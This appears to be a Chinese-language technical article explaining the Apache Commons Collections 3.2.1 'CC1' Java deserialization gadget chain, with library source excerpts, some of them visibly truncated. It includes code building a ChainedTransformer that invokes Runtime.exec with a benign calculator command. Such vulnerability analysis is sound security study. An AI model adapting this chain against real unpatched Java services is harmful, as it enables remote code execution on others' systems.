0x00 前言

CC指的是 Apache Commons Collections 库，该库是对 Java Collections 的一个扩展，旨在简化集合操作，并提供更强大和灵活的集合操作能力。

可以通过maven等依赖管理工具引入该库，如：

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version> <!-- 该版本包含CC1漏洞 -->
</dependency>

0x01 漏洞链信息

1.1 利用限制

  • 漏洞存在于JDK 8u71之前版本，该版本及后续版本修复了触发点。
  • Apache Commons Collections库在3.2.2版本修复了该漏洞。
  • 目标环境需要存在有漏洞的Apache Commons Collections库。

1.2 涉及的核心组件

组件类名功能/在利用链中承担的作用
InvokerTransformer最基础的执行者，通过反射调用任意方法
ConstantTransformer返回指定的类对象。规避不能通过反射获取类的情况，如Runtime.class
ChainedTransformer链式执行器，将多个执行者连接起来，并依次执行
LazyMap/TransformedMap触发点，触发链式执行器
AnnotationInvocationHandler入口点，通过该类反序列化时的readObject方法引动触发点，触发利用链

0x02 漏洞原理

2.1 InvokerTransformer

InvokerTransformer类的transform方法中存在一组反射调用，这是漏洞产生的根源。

 1// org.apache.commons.collections.functors.InvokerTransformer
 2    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
 3      this.iMethodName = methodName;
 4      this.iParamTypes = paramTypes;
 5      this.iArgs = args;
 6   }
 7
 8   public Object transform(Object input) {
 9      if (input == null) {
10         return null;
11      } else {
12         try {
13            Class cls = input.getClass();
14            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
15            return method.invoke(input, this.iArgs);
16         } catch (NoSuchMethodException var4) {
17            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
18         } catch (IllegalAccessException var5) {
19            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
20         } catch (InvocationTargetException var6) {
21            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
22         }
23      }
24   }

简单观察可见，反射调用的类对象由transform方法参数传入，调用的类方法与方法参数可以在生成InvokerTransformer实例时通过构造方法指定。所以，通过调用可控的InvokerTransformer对象的transform方法，可以调用任意可通过反射获取的类的任意方法。以下是一个简单示例：

1Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
2transformer.transform(Runtime.getRuntime());

2.2 ChainedTransformer

根据以上可知，如果可以传入Runtime实例作为transform方法的输入参数，就可以执行任意命令了。但是Runtime类没有实现Serializable接口，所以无法直接传入实例。

由于Runtime类的特殊，没有办法通过反射调用构造方法构造Runtime实例。但Runtime类提供了public修饰的getRuntime()方法来返回Runtime实例，所以通过反射来调用该方法获取Runtime实例是可行的方法。

反射调用流程上，需要通过getMethod、invoke两步来调用getRuntime()方法，这两步本身也需要通过反射来调用。最后再调用exec()方法以执行命令。ChainedTransformer类刚好符合需求。

 1// org.apache.commons.collections.functors.ChainedTransformer
 2public ChainedTransformer(Transformer[] transformers) {
 3      this.iTransformers = transformers;
 4   }
 5
 6   public Object transform(Object object) {
 7      for(int i = 0; i < this.iTransformers.length; ++i) {
 8         object = this.iTransformers[i].transform(object);
 9      }
10
11      return object;
12   }

ChainedTransformer类的构造方法接收一个Transformer数组作为参数，transform()方法则遍历该数组，依次调用数组中的Transformer对象的transform()方法，并将当前对象的transform()方法的输出结果作为参数传递给下一个Transformer对象的transform()方法。ChainedTransformer.transform()接收的参数作为数组中第一个Transformer对象的transform()方法的参数，数组中最后一个Transformer对象的transform()方法的输出结果作为返回值返回。

现在，只需要依次构造InvokerTransformer实例组成数组传递给ChainedTransformer再调用transform()方法即可。但是transform()方法接收的参数会影响链的执行，所以需要满足一个条件：无论输入参数是什么，数组中的第一个Transformer.transform()都返回固定结果，而且这个结果需要可控（固定是Runtime.class）。

2.3 ConstantTransformer

ConstantTransformer类的构造方法接受一个参数，该参数会被transform方法原封不动的返回。

1// org.apache.commons.collections.functors.ConstantTransformer
2    public ConstantTransformer(Object constantToReturn) {
3      this.iConstant = constantToReturn;
4   }
5
6   public Object transform(Object input) {
7      return this.iConstant;
8   }

当以Runtime.class作为参数构造一个ConstantTransformer实例时，执行transform方法将获得一个描述Runtime类的Class对象，完美符合上述需求。构造ChainedTransformer实例如下：

1Transformer[] transformers = new Transformer[]{
2    new ConstantTransformer(Runtime.class),
3    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", null }),
4    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, null }),
5    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open -a Calculator" }),
6}
7
8Transformer transformerChain = new ChainedTransformer(transformers);
9// transformerChain.transform("anything");

2.4 触发点

通过以上方式构造好ChainedTransformer实例后，只需执行该实例的transform()方法即可执行任意命令。现在需要找个办法，自动调用transform()方法。以下介绍两个类作为自动调用transform()方法的触发点。

2.4.1 LazyMap

org.apache.commons.collections.map.LazyMap 类声明如下：

 1package org.apache.commons.collections.map;
 2// ...
 3public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
 4   private static final long serialVersionUID = 7990956402564206740L;
 5   protected final Transformer factory;
 6
 7   // ...
 8
 9   public static Map decorate(Map map, Transformer factory) {
10      return new LazyMap(map, factory);
11   }
12
13   protected LazyMap(Map map, Transformer factory) {
14      super(map);
15      if (factory == null) {
16         throw new IllegalArgumentException("Factory must not be null");
17      } else {
18         this.factory = factory;
19      }
20   }
21
22   public Object get(Object key) {
23      if (!this.map.containsKey(key)) {
24         Object value = this.factory.transform(key);
25         this.map.put(key, value);
26         return value;
27      } else {
28         return this.map.get(key);
29      }
30   }
31}

LazyMap类通过静态方法decorate()接受两个参数，并通过传递这两个参数调用构造方法返回一个LazyMap对象。两个参数分别为Map接口实例和Transformer接口实例，并在经过一定判断逻辑后赋值给LazyMap类的两个属性字段。

get()方法通过判断Map接口实例中是否存在对应键值对，如果存在则返回对应的值，否则调用Transformer实例的transform()方法进行转换并返回转换后的值。

所以如果传递 2.3中构建的ChainedTransformer实例作为参数构建一个LazyMap实例，再满足判断条件（传入的Map实例完全受控，只需要传入一个空的Map实例判断条件就恒成立 ），则LazyMap类调用get()方法时就会调用ChainedTransformer实例的transform()方法。现在只需要能调用LazyMap.get()方法即可执行任意命令。

2.4.2 TransformerMap

org.apache.commons.collections.map.TransformerMap 类声明如下：

 1public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {
 2    /** Serialization version */
 3    private static final long serialVersionUID = 7023152376788900464L;

 7    protected final Transformer valueTransformer;
 8    // ...
 9    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
10        return new TransformedMap(map, keyTransformer, valueTransformer);
11    }
12   // ...
13    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {

15        this.keyTransformer = keyTransformer;
16        this.valueTransformer = valueTransformer;
17    }
18    // ...
19    /**

可以看到，TransformedMap类通过静态方法decorate()接受三个参数，并使用这三个参数构造并返回一个TransformedMap对象。参数类型分别为Map和两个Transformer，后两者分别用于转换map的key和value。

TransformedMap类提供了checkSetValue()方法，用于在调用setValue()方法前使用提供的valueTransformer来转换对应的值。现在，只要找到入口调用TransformedMap的checkSetValue()方法，就可以执行任意命令。

2.5 入口类：AnnotationInvocationHandler

类对象反序列化时会调用该类的readObject()方法，该方法就是反序列化漏洞攻击的入口点。CC1利用链的入口点对象是sun.reflect.annotation.AnnotationInvocationHandler类。

AnnotationInvocationHandler类实现了InvocationHandler接口，是一个动态代理类。它的构造方法接受两个参数，类型分别是继承自Annotation接口的类对象和Map对象，分别赋值给type属性和memberValues属性。

 3   private final Class<? extends Annotation> type;
 4   private final Map<String, Object> memberValues;
 5   private transient volatile Method[] memberMethods = null;

14      }

16   // ...
17}

2.5.1 For LazyMap

2.4.1 中已经讲到，只要能调用LazyMap.get()方法即可执行任意命令。而作为实现了InvocationHandler接口的动态代理类，AnnotationInvocationHandler类中会在符合条件时自动调用的invoke()方法刚好符合要求。只需要构造一个符合条件的LazyMap对象，使得代码走到default分支，即可执行任意命令。

 1class AnnotationInvocationHandler implements InvocationHandler, Serializable {

 6      String var4 = var2.getName();

14            case "toString":
15               return this.toStringImpl();
16            case "hashCode":
17               return this.hashCodeImpl();
18            case "annotationType":

20            default:

22               // ...

到了这一步之后，就需要找到条件自动调用mapProxy实例的某个方法，以实际调用AnnotationInvocationHandler类的invoke方法。为了可以在invoke方法中走到default分支，这个某个方法需要满足以下条件：

  • 方法名不能是equals、hashCode、toString、annotationType
  • 方法不能有参数

而要在反序列化过程中自动调用mapProxy实例的某个上述方法，基本要求这个方法在序列化入口点类的readObject()方法中被直接或者间接调用。AnnotationInvocationHandler类刚好符合。

2.5.2 For TransformedMap

2.4.2 中讲到，只要调用TransformedMap的checkSetValue()方法，就可以执行任意命令。在反序列化漏洞利用中，就需要该方法在某个类的readObject()方法中被直接或者间接调用。AnnotationInvocationHandler类刚好符合。

  • 上述键值对中的键值不能是上述Annotation类的方法的返回值类型
  • 上述键值对中的键值不能是ExceptionProxy类型

2.6 其他

AnnotationInvocationHandler 是 Java 内部实现注解机制的核心类，其主要职责是为注解接口（Annotation Interface）动态生成代理实例，并将注解的属性值绑定到该实例上。

注解示例：

1@MyAnnotation(value = "hello", id = 1)
2class Test {
3    // .....
4}

注解接口示例(要先有该注解接口才能使用上示的注解)：

1public @interface MyAnnotation {
2    String value() default "";
3    int id() default 0;
4}

在JVM运行时，就需要构造注解实例，使得调用对应的方法时可以获取到对应的值。但注解本身是接口，没有实现类，所以JVM就通过创建一个实现了该接口的代理类的方式来构造注解实例。实现这个功能的核心类就是AnnotationInvocationHandler。

AnnotationInvocationHandler的构造函数接收Class<? extends Annotation>和 Map<String, Object>两个参数，前者表明代理的注解接口，后者则存储该注解的属性值。调用注解类方法获取属性值时，实际是调用AnnotationInvocationHandler的invoke()方法，根据方法名从传进来的map中获取对应的值。
